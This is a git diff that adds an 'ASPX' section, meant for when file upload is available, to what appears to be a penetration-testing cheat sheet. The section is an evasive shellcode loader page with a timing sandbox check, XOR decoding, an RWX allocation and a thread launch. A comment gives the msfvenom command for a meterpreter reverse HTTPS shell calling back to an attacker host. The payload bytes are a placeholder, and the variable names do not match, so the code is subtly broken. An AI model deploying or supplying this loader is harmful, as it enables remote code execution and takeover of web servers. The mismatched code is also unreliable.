@@ -146,3 +146,66 @@ Sub AutoOpen()
     mymacro
 End Sub
 ```
+
+#### ASPX
+
+When file upload is availble&#x20;
+
+```
+<%@ Page Language="C#" AutoEventWireup="true" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+    private static Int32 MEM_COMMIT=0x1000;
+    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+    private static extern void Sleep(uint dwMilliseconds);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+    private static extern IntPtr GetCurrentProcess();
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    [System.Runtime.InteropServices.DllImport("kernel32")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);
+
+    [System.Runtime.InteropServices.DllImport("kernel32")]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
+
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        DateTime t1 = DateTime.Now;
+        Sleep(2000);
+        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+        if (t2 < 1.5)
+        {
+            return;
+        }
+        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+        if(mem == null)
+        {
+        return;
+        }
+        //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.Y LPORT=443 -f csharp --encrypt xor --encrypt-key J
+        byte[] buf = new byte[675] {PAYLOAD}
+
+        for (int i = 0; i < lARghkUgnHX.Length; i++)
+        {
+                lARghkUgnHX[i] = (byte)(((uint)lARghkUgnHX[i]) ^ 0x4a);
+        }
+
+        IntPtr qT7BpE1k7XJ = VirtualAlloc(IntPtr.Zero,(UIntPtr)lARghkUgnHX.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        System.Runtime.InteropServices.Marshal.Copy(lARghkUgnHX,0,qT7BpE1k7XJ,lARghkUgnHX.Length);
+        IntPtr pFkdzu2jNz = IntPtr.Zero;
+        IntPtr dggB9vQ = CreateThread(IntPtr.Zero,UIntPtr.Zero,qT7BpE1k7XJ,IntPtr.Zero,0,ref pFkdzu2jNz);
+    }
+</script>
+
+```
